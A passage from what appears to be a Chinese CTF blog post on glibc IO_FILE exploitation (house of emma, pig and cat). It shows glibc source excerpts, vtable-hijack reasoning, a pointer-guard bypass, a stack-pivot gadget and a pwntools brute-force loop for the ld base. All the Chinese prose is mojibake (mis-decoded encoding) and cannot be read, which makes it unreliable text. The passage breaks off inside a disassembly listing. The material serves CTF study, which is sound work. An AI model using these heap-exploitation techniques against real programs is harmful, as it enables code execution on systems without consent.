ret</span><br></pre></td></tr></table></figure><p>Âõ¥Áªï<code>rdx</code>ËøõË°åÂèÇÊï∞ÁöÑÂ∏ÉÁΩÆÔºåÂ∞±ËÉΩËÆæÁΩÆÂ•ΩÂêÑ‰∏™ÂØÑÂ≠òÂô®</p><p>ËøôÈáåÊúÄÈáçË¶ÅÁöÑ‰∏§Êù°ÊòØ</p><p><code>[rdx+0xa0]</code> &#x3D;&gt; <code>rsp</code></p><p><code>[rdx+0xa8]</code> &#x3D;&gt; <code>rcx</code> &#x3D;&gt; <code>ret</code></p><p>Êàë‰ª¨ÈÄöÂ∏∏Â∞Ü<code>rcx</code>Â∏ÉÁΩÆ‰∏∫<code>ret</code>ÁöÑgadgetÔºåËøôÊ†∑Âú®ÊúÄÂêé<code>ret</code>ÁöÑÊó∂ÂÄôÂ∞±ËÉΩÂÆûÁé∞Ê†àËøÅÁßªÂà∞ËµãÁªô<code>rsp</code>ÁöÑÂú∞ÂùÄ‰∏ä</p><h2 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h2><p>ÂèØ‰ª•ÁêÜËß£‰∏∫kiwiË°çÁîüÂá∫ÁöÑÊîªÂáªÊâãÊ≥ïÔºåÈúÄË¶Å‰ª•‰∏ã‰∏â‰∏™Êù°‰ª∂</p><ol><li><p>ÂèØ‰ª•<strong>‰ªªÊÑèÂÜô</strong>‰∏Ä‰∏™ÂèØÊéßÂú∞ÂùÄÔºàLargeBin Attack„ÄÅTcache Stashing Unlink Attack‚Ä¶Ôºâ</p></li><li><p>‰∏ÄÊ¨°<strong>‰ªªÊÑèÂú∞ÂùÄËØª</strong> Êàñ ÂÜçÊù•‰∏ÄÊ¨°<strong>‰ªªÊÑèÂÜô</strong></p></li><li><p>ÂèØ‰ª•<strong>Ëß¶Âèë IO ÊµÅ</strong>ÔºàFSOP„ÄÅhouse of kiwiÔºâ</p></li></ol><p>Âà©Áî®ÁöÑËôöË°®‰∏∫<code>_IO_cookie_jumps</code>ÔºåÂ≠òÂú®ÊãìÂ±ïÁªìÊûÑ<code>_IO_cookie_file</code>ÔºàËøòÊòØ<code>_IO_FILE_plus</code>Âä†ÈïøÁâàÔºâÔºåÂ§ö‰∫Ü‰∏Ä‰∏™ÂáΩÊï∞Ë°®ÔºåÂ≠òÂú®Âä´ÊåÅÁöÑÂèØËÉΩ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> __<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_io_functions_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure><p>ÈúÄË¶ÅË∞ÉÁî®ÁöÑËôöË°®ÂáΩÊï∞Â¶Ç‰∏ã</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåÂÜô‰∫Ü4‰∏™ÂáΩÊï∞ÔºåÂÖ∂ÂÆûÂ§ßÂêåÂ∞èÂºÇÔºåÈÉΩË∞ÉÁî®‰∫Ü‰∏Ä‰∏™‰ªé<code>_IO_cookie_file</code>ÁªìÊûÑ‰ΩìÁöÑÂáΩÊï∞Ë°®‰∏≠ÂèñÂá∫ÁöÑÂáΩÊï∞ÊåáÈíàÔºå‰ª•<code>_IO_cookie_write</code>‰∏∫‰æã</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;<span class="comment">//ÂèñÂá∫ÂáΩÊï∞ÊåáÈíà</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);<span class="comment">//ÊåáÈíà‰øùÊä§</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);<span class="comment">//Ë∞ÉÁî®ÂáΩÊï∞</span></span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊâÄ‰ª•Êàë‰ª¨Âè™ÈúÄ‰º™ÈÄ†<code>_IO_cookie_file</code>ÁªìÊûÑ‰ΩìÁöÑÂáΩÊï∞Ë°®ÔºåÂ∞±ËÉΩË∞ÉÁî®‰ªªÊÑèÂáΩÊï∞„ÄÇÂêåÊó∂ËøôÈáåÁöÑ<code>rdi</code>ÊòØÂèØÊéßÁöÑ„ÄÇÂ¶ÇÊûúË¶ÅÊâìgetshellÔºåÂèØ‰ª•Áõ¥Êé•ÊûÑÈÄ†ÔºõÂ¶ÇÊûúË¶ÅÊâìorwÔºåÂèØ‰ª•Âà©Áî®libc‰∏≠‰∏Ä‰∏™gadgets</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, qword ptr [rdi + 8]; </span><br><span class="line">mov qword ptr [rsp], rax; </span><br><span class="line">call qword ptr [rdx + 0x20];</span><br></pre></td></tr></table></figure><p>ÂÆåÊàê‰ªéÂèØÊéß<code>rdi</code>Âà∞ÂèØÊéß<code>rdx</code>ÁöÑËΩ¨Êç¢</p><p>Ê≠§Â§ñÔºå<code>_IO_cookie_file</code>ÈáåÁöÑÂáΩÊï∞ÊåáÈíà‰∏çËÉΩÁõ¥Êé•‰º™ÈÄ†ÔºåÂõ†‰∏∫ÈªòËÆ§ÂºÄÂêØ‰∫ÜPTR_DEMANGLE ÔºàÊåáÈíà‰øùÊä§Ôºâ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">uintptr_t</span> __pointer_chk_guard attribute_relro;</span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var) PTR_MANGLE (var)</span></span><br></pre></td></tr></table></figure><p><code>__pointer_chk_guard</code>Â≠òÂú®‰∫éTLSÊÆµ‰∏äÔºåÂ∞ÜÂÖ∂RORÁßª‰Ωç0x11ÂêéÂÜç‰∏éÂ≠òÂÖ•ÁöÑÂú∞ÂùÄËøõË°åÂºÇÊàñ</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811213323111.png" alt="image-20230811213323111"></p><p><code>fs[0x30]</code>ÁöÑÂÄº‰Ωç‰∫é‰∏élibcÁõ∏ÈÇªÁöÑldÁ©∫Èó¥‰∏≠ÔºåËøô‰∏™‰ΩçÁΩÆË∑ùÁ¶ªlibcÂú∞ÂùÄÁöÑÂÅèÁßªÂõ∫ÂÆöÔºåÂèØËÉΩ‰∏éÊú¨Âú∞patchelfÂêé‰∏ç‰∏ÄËá¥ÔºåÂèØ‰ª•ÈÄöËøáÁàÜÁ†¥ÂæóÂà∞„ÄÇÂõ†‰∏∫ÂÅèÁßªÁöÑÂèòÂåñÂÄºÂæÄÂæÄÂú®Âú∞ÂùÄÊú´Â∞æÁöÑÁ¨¨Âõõ‰∏™„ÄÅÁ¨¨‰∫î‰∏™Êï∞ÔºàÊú´‰∏â‰Ωç‰∏çÂèòÔºâÔºåÂèØÁºñÂÜôÂ¶Ç‰∏ãËÑöÊú¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            libc_base = <span class="number">0x1234</span></span><br><span class="line">            offset = <span class="number">0x6</span> &lt;&lt; <span class="number">20</span></span><br><span class="line">            offset += x &lt;&lt; <span class="number">16</span></span><br><span class="line">            offset += y &lt;&lt; <span class="number">12</span></span><br><span class="line">            ld_base = libc_base + offset</span><br><span class="line">            log.success(<span class="string">&quot;try offset:\t&quot;</span> + <span class="built_in">hex</span>(offset))</span><br><span class="line">            <span class="comment"># your code</span></span><br><span class="line">            sh.interactive()</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure><p>ËØ¶ÁªÜÈ¢òËß£ÂèØ‰ª•Áúã<a href="https://deepunk42.github.io/2023/07/27/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/">Âè¶‰∏ÄÁØáÂçöÂÆ¢</a></p><h2 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h2><ul><li><p>Áî®‰∫éÁ®ãÂ∫è‰∏≠Âè™Êúâ<code>calloc</code>ËÄåÊ≤°Êúâ<code>malloc</code>ÁöÑÊÉÖÂÜµ</p></li><li><p>ÈÄöÂ∏∏ÈúÄË¶Å<strong>‰∏ÄÊ¨°largebin attack</strong>‰ª•ÂÆåÊàêtcache stashing unlink attackÁöÑÂáÜÂ§á</p></li><li><p>ÈúÄË¶Å<strong>‰∏ÄÊ¨°tcache stashing unlink attack</strong></p></li></ul><p>Ë∞ÉÁî®ËôöË°®<code>_IO_str_jumps</code> -&gt; <code>_IO_str_overflow</code>ÂáΩÊï∞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *new_buf;</span><br><span class="line">          <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">          <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">          <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">          <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">          new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 1</span></span><br><span class="line">          <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">              <span class="keyword">return</span> EOF;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">if</span> (old_buf)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">// 2</span></span><br><span class="line">              <span class="built_in">free</span> (old_buf); <span class="comment">// 3</span></span><br><span class="line">              <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">              fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen); <span class="comment">// 4</span></span><br><span class="line"> </span><br><span class="line">          _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">          fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">          fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">          fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">          fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><blockquote><p>Êâìtcache stashingÊ≤°Êúâ<code>malloc</code>Âèñ‰∏çÂá∫chunkÊÄé‰πàÂäûÔºü</p><p>ÊàëÊúâ<code>_IO_str_overflow</code>ÔºÅÔºÅÔºÅÔºàËá™Ë±™Ôºâ</p></blockquote><p>Ëøô‰∏™ÂáΩÊï∞‰∏≠ÔºåÂÆåÁæéËææÊàê<code>malloc</code>„ÄÅ<code>memcpy</code>„ÄÅ<code>free</code>‰∏ÄÊù°ÈæôÊúçÂä°</p><p>‰ªÄ‰πàÔºü‰Ω†ÁöÑÁâàÊú¨Â§™È´òÊâì‰∏ç‰∫Ü<code>free_hook</code>Ôºü</p><p>Ê≤°ÂÖ≥Á≥ªÔºåÊúÄÂêéËøòÊúâ‰∏Ä‰∏™<code>memset</code>ÂèØ‰ª•ÂÜôlibc‰∏≠ÁöÑgotË°®</p><p>Â¶ÇÊûúÈúÄË¶ÅÊâìorwÔºå<code>rdx</code>‰πüÊòØÂèØÊéßÁöÑ</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811214840282.png" alt="image-20230811214840282"></p><p><code>&lt;+53&gt;mov rdx, QWORD PTR [rdi+0x28]</code></p><p><code>rdi</code>ÊåáÂêë<code>_flags</code>Ôºå<code>rdi+0x28</code>ÊåáÂêë<code>_IO_write_ptr</code>ÔºåÂèØÊéß</p><p>ËØ¶ÁªÜÈ¢òËß£ÂèØ‰ª•Áúã<a href="https://deepunk42.github.io/2023/07/27/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0/">Âè¶‰∏ÄÁØáÂçöÂÆ¢</a></p><h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>Âè™ÈúÄË¶Å<strong>‰∏ÄÊ¨°</strong>‰ªªÊÑèÂÜôÔºÅ</p><p>Ë∞ÉÁî®ËôöË°®<code>_IO_wfile_jumps</code>‰∏≠ÁöÑ<code>_IO_wfile_seekoff</code>ÂáΩÊï∞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line">#ÈúÄË¶ÅÁªïËøáwas_writingÁöÑÊ£ÄÊµã</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">              || _IO_in_put_mode (fp));</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊúÄÁªàÁõÆÁöÑÊòØË∞ÉÁî®<code>_IO_switch_to_wget_mode</code>ÂáΩÊï∞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">‚ñ∫ 0x7fbbb9489d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line">  0x7fbbb9489d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">  0x7fbbb9489d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class="line">  0x7fbbb9489d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class="line">  0x7fbbb9489d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">  0x7fbbb9489d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">  0x7fbbb9489d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56                </span><br><span class="line">  0x7fbbb9489d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">  0x7fbbb9489d50 